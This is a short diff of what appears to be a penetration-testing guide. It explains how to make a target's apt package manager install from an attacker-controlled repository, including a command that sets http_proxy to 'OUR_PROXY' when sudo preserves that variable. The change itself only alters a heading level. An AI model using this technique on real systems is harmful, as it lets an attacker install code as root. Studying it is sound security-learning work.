@@ -20,7 +20,7 @@
 
 ### Requirements: Trace down where the apt manager of the target machine installs its packages from by checking out the /etc/apt/sources.list/ directory. Also choose a package which is already present on the target machine (wget for example).
 
-##### TIP: In sudo configurations (sudo -l) if the http_proxy environment variable is kept while the command is executed as root, before doing the required setup, we can also do: export http_proxy="http://OUR_PROXY:8000" (The proxy is the one we open if we detect this env variable to force the package manager to use our repository) Run the proxy first, then run a simple python3 server and then check if your server receives any requests.
+### TIP: In sudo configurations (sudo -l) if the http_proxy environment variable is kept while the command is executed as root, before doing the required setup, we can also do: export http_proxy="http://OUR_PROXY:8000" (The proxy is the one we open if we detect this env variable to force the package manager to use our repository) Run the proxy first, then run a simple python3 server and then check if your server receives any requests.
 
 ### Steps:
 
